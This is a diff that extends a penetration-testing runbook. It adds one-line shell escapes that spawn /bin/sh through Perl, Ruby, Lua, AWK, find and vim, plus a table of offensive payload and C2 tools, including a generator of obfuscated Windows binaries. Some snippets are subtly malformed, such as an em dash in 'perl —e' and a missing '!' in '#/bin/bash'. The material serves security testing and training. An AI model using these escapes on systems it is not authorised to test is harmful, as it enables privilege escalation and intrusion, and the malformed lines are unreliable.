@@ -40,6 +40,15 @@ This runbook provides a guide to for various shells and payloads. It includes a 
     - [Webshell Infecting views.py - Python (Flask)](#webshell-infecting-viewspy---python-flask)
     - [nodejs](#nodejs)
     - [Perl](#perl)
+    - [Ruby](#ruby)
+    - [Lua](#lua)
+    - [AWK](#awk)
+    - [Find](#find)
+    - [Using Exec To Launch A Shell](#using-exec-to-launch-a-shell)
+    - [VIM](#vim)
+      - [Vim To Shell](#vim-to-shell)
+      - [Vim Escape](#vim-escape)
+  - [Payload Generation](#payload-generation)
   - [Spawn tty via Python](#spawn-tty-via-python)
   - [Spawn an upgraded shell](#spawn-an-upgraded-shell)
 
@@ -247,9 +256,77 @@ https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester
 ### Perl
 
 Find and edit
+
 ```
 locate perl-reverse-shell.pl
 ```
+
+Perl to shell
+
+```sh
+#/bin/bash
+perl —e 'exec "/bin/sh";'
+```
+```perl
+#/perl
+perl: exec "/bin/sh";
+```
+
+### Ruby
+
+```ruby
+ruby: exec "/bin/sh"
+```
+
+### Lua
+
+```
+lua: os.execute('/bin/sh')
+```
+
+### AWK
+
+```
+awk 'BEGIN {system("/bin/sh")}'
+```
+
+### Find
+
+```sh
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+
+### Using Exec To Launch A Shell
+
+```
+find . -exec /bin/sh \; -quit
+```
+
+### VIM
+
+#### Vim To Shell
+
+```
+vim -c ':!/bin/sh'
+```
+
+#### Vim Escape
+
+```
+vim
+:set shell=/bin/sh
+:shell
+```
+
+## Payload Generation
+
+| Resource | Description |
+| ----- | ---- |
+| [MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework) |	MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.
+| [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings) |  Here, you can find many different resources and cheat sheets for payload generation and general methodology.
+| [Mythic C2 Framework](https://github.com/its-a-feature/Mythic) | The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.
+| [Nishang](https://github.com/samratashok/nishang) | Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.
+| [Darkarmour](https://github.com/bats3c/darkarmour) | Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.
 
 ## Spawn tty via Python
 
@@ -267,4 +344,4 @@ export TERM=xterm && /usr/bin/script -qc /bin/bash /dev/null
 stty raw -echo; fg 
 ```
 
- <!--- Last Updated July 8, 2024 --->
+ <!--- Last Updated Jan 12, 2025 --->
